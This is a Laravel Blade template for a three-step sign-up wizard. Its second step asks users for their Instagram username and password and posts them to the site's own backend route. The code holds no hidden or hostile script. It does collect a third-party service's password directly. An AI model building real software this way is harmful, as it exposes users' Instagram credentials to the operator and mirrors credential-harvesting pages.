@extend('login_registration.master')
@section('content')
<div class="container u_main_content">
      <div class="row">
          <div class="page_heading">
              <h2 class="">Easy Sign IN in 3STEP</h2>
          </div>
          <div class="wizard">
              <div class="wizard-inner">
                  <!-- <div class="connecting-line"></div> -->
                  <ul class="nav nav-tabs" role="tablist">

                      <li role="presentation" class="step_1">
                          <a class="" href="{{URL::to('user-registration')}}"  title="Step 1">
                              <span class="round-tab">
                                  <p>#1</p>
                              </span>
                          </a>
                      </li>

                      <li role="presentation" class="disabled step_2">
                          <a class="active" href="{{URL::to('user-login')}}" title="Step 2">
                              <span class="round-tab">
                                  <p>#2</p>
                              </span>
                          </a>
                      </li>

                      <li role="presentation" class="disabled step_3">
                          <a href="{{URL::to('registration-success')}}" title="Complete">
                              <span class="round-tab">
                                  <p>#3</p>
                              </span>
                          </a>
                      </li>
                  </ul>
              </div>

              <div class="sign_in_form">
                <div class="form_title">
                  <h3>Enter Instagram Account Information</h3>
                  @if(session('check'))
                    <div class="alert alert-danger">
                        {{ session('check') }}
                    </div>
                    @endif
                </div>
                <form role="form" method="POST" action="{{ URL::to('instagram-registration') }}">
                  {{ csrf_field() }}
                    <div class="form-group{{ $errors->has('email') ? ' has-error' : '' }}">
                      <label for="email">Instagram username</label>
                      <input type="name" class="form-control" name="email" id="email" placeholder="Username" value=""  required="">
                      @if ($errors->has('email'))
                          <span class="help-block">
                              <strong>{{ $errors->first('email') }}</strong>
                          </span>
                      @endif
                    </div>
                    <div class="form-group{{ $errors->has('password') ? ' has-error' : '' }}">
                      <label for="password">Instagram Password</label>
                      <input type="password" class="form-control" name="password" id="password" placeholder="Password" required="">
                      @if ($errors->has('password'))
                          <span class="help-block">
                              <strong>Please set the password with at least 6 characters.</strong>
                          </span>
                      @endif
                    </div>

                    <div class="button_holder">                      
                      <button type="submit" class="btn registration_btn">Next</button>
                      <div class="form-group">                      
                        <a href="#">Contact Us Here</a>
                      </div>
                    </div>
                    
                </form>
              </div>
          </div>
       </div>
    </div>
@endsection